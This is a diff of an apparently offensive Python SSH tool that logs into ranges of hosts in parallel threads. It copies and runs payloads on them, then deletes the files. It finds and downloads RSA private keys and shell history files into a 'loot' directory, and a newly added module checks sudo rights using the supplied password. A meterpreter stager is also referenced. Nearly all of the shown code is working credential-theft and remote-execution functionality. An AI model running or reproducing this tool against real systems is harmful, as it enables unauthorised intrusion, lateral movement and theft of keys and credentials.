@@ -1,7 +1,5 @@
 import base64
 import paramiko
-import sys
-import atexit
 import SimpleHTTPServer
 import SocketServer
 import thread
@@ -10,125 +8,110 @@ import socket
 from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
 import threading
 import time
-import urllib
-import urllib2
-import ssl
-import requests
 import os
 import random
 import string
-
+import re
 CRED = '\033[91m'
 CEND = '\033[0m'
 CGREEN  = '\33[32m'
 CYELLOW = '\33[33m'
 
-
+paramiko.util.log_to_file("filename.log")
 def randomword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
 
+def connect(ip, username, password, identity_file):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    try:
+        if identity_file:
+            key_path = identity_file
+            key = paramiko.RSAKey.from_private_key_file(key_path)
+            if password:
+                key = paramiko.RSAKey.from_private_key_file(key_path, password=password)
+                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
+            else:
+                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
+        else:
+            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
+        print CGREEN + "[+] Successful authentication to " + str(ip) + "!" + CEND
+    except socket.timeout:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+        return False
+    except socket.error:
+        print CRED + "[-] Failed to connect to " + str(ip) + CEND
+        return False
+    except paramiko.ssh_exception.AuthenticationException:
+        print CRED + "[!] Authentication failed on " + str(ip) + "!" + CEND
+        return False
+    return client
+
 
 def copy_exec(ip, username, password, identity_file, file, timeout):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client = connect(ip, username, password, identity_file)
     print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    sftp = client.open_sftp()
+    sftp.put('output/' + file, file)
+    print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
+    print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
+    stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
     try:
-        if identity_file:
-            key_path = identity_file
-            key = paramiko.RSAKey.from_private_key_file(key_path)
-            if password:
-                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
-            else:
-                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
-        else:
-            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
-        sftp = client.open_sftp()
-        sftp.put('output/' + file, file)
-        print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
-        print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-        stdin, stdout, stderr = client.exec_command(" chmod +x "+ file +"; sleep 1; rm "+ file + " & ./" + file, timeout=timeout)
-        try:
-            for line in stdout:
-                print line
-        except socket.timeout:
-            pass
+        for line in stdout:
+            print line
     except socket.timeout:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except socket.error:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except paramiko.ssh_exception.AuthenticationException:
-        print CRED + "[!] Authentication failed!" + CEND
-
+        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
 def steal(ip, username, password, identity_file, type, timeout):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    client = connect(ip, username, password, identity_file)
+    if type == "keys":
+        command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
+    if type == "history":
+        command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
+    stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
     try:
-        if identity_file:
-            key_path = identity_file
-            key = paramiko.RSAKey.from_private_key_file(key_path)
-            if password:
-                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
-            else:
-                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
-        else:
-            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
-        if type == "keys":
-            command = "find /home/ /root/ /Users/ -type f -exec awk 'FNR==1 && /RSA PRIVATE KEY/ { print FILENAME  }; FNR>1 {nextfile}' {} + 2>/dev/null "
-        if type == "history":
-            command = "find /home /root /Users -name .\*_history -type f 2>/dev/null"
-        stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
-        try:
-            sftp = client.open_sftp()
-            for line in stdout:
-                line = line.rstrip()
-                if not os.path.exists("loot/" + type + "/" + str(ip)):
-                    os.makedirs("loot/" + type + "/" + str(ip))
-                print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
-                try:
-                    sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
-                except:
-                    print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
-            #sftp.close()
-        except socket.timeout:
-            pass
+        sftp = client.open_sftp()
+        for line in stdout:
+            line = line.rstrip()
+            if not os.path.exists("loot/" + type + "/" + str(ip)):
+                os.makedirs("loot/" + type + "/" + str(ip))
+            print CGREEN + "[+] Copying " + line + " from " + str(ip) + "!" + CEND
+            try:
+                sftp.get(line, "loot/" + type + "/" + str(ip) + "/" + line.replace("/", "_"))
+            except:
+                print CRED + "[-] Failed to copy " + line + " from " + str(ip) + CEND
     except socket.timeout:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except socket.error:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except paramiko.ssh_exception.AuthenticationException:
-        print CRED + "[!] Authentication failed!" + CEND
-
+        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
 def execute_command(ip, username, password, identity_file, command, timeout):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    print CYELLOW + "[*] Connecting to " + str(ip) + "..." + CEND
+    client = connect(ip, username, password, identity_file)
     try:
-        if identity_file:
-            key_path = identity_file
-            key = paramiko.RSAKey.from_private_key_file(key_path)
-            if password:
-                client.connect(str(ip), port=22, username=username, pkey=key, password=password, timeout=1)
-            else:
-                client.connect(str(ip), port=22, username=username, pkey=key, timeout=1)
-        else:
-            client.connect(str(ip), port=22, username=username, password=password, timeout=1)
-        try:
+        if client != False:
             stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
-            print CGREEN + "[+] Executed on " + str(ip) + "!" + CEND
+            print CGREEN + "[+] Executed on " + str(ip) + "..." + CEND
             for line in stdout:
                 print line
-        except socket.timeout:
-            print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
     except socket.timeout:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except socket.error:
-        print CRED + "[-] Failed to connect to " + str(ip) + CEND
-    except paramiko.ssh_exception.AuthenticationException:
-        print CRED + "[!] Authentication failed!" + CEND
+        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
+
+def check_privs(ip, username, password, identity_file, timeout):
+    client = connect(ip, username, password, identity_file)
+    try:
+        if client != False:
+            stdin, stdout, stderr = client.exec_command("sudo --list", timeout=timeout, get_pty = True)
+            if password:
+                stdin.write(password + '\n')
+                stdin.flush()
+                for line in stdout:
+                    if "may run the following commands on" in line:
+                        print line.strip()
+                        for line in stdout:
+                            print line.strip()
+
+    except socket.timeout:
+        print CYELLOW + "[*] Command was ran, but timed out before output was received for " + str(ip) + CEND
 
 
 def start_thread(targets, function, args):
@@ -136,15 +119,19 @@ def start_thread(targets, function, args):
         if function == "execute_command":
             t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4],args[5]))
             t.start()
-        time.sleep(.5)
+        time.sleep(.25)
         if function == "copy_exec":
             t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4],args[5]))
             t.start()
-        time.sleep(.5)
+        time.sleep(.25)
         if function == "steal":
             t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4],args[5]))
             t.start()
-        time.sleep(.5)
+        time.sleep(.25)
+        if function == "check_privs":
+            t = threading.Thread(target=check_privs, args=(ip, args[1], args[2], args[3], args[4]))
+            t.start()
+        time.sleep(.25)
 
 
 def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password, identity_file):
@@ -379,6 +366,9 @@ def main():
         print CGREEN + "[!] Searching system for command history..." + CEND
         start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "history", 100])
 
+    if args.module == "privs":
+        print CGREEN + "[!] Checking sudo permissions..." + CEND
+        start_thread(targets, "check_privs",[22, args.username, args.password, args.identity_file, 10])
 
     if args.module == "meterpreter":
         if not args.options:
